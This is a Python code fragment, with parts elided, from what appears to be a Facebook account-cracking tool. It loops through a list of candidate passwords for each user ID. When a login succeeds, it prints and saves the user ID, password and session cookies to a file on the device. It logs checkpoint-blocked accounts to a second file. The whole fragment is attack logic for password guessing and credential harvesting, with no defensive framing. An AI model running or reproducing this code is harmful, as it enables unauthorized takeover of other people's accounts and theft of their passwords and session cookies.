	...
	try:
		...
		for pas in mking_pass:
			...
			if 'session_key' in po:
				...
				print('\r\r\033[1;32m [MKING-OK] '+str(uid)+' | '+pas+'\033[1;97m')
				print('\r\r\033[1;32m [COOKIES] %s   '%(coki))
				open('/sdcard/MKING-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
				oks.append(str(uid))
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = po['error']['error_data']['uid']
				print('\r\r\x1b[1;33m [MKING-CP] '+str(uid)+' | '+pas+'\033[1;97m')
				open('/sdcard/MKING-CP.txt','a').write(str(uid)+'|'+pas+'\n')
				cps.append(str(uid))
				break
			else:continue
		loop+=1
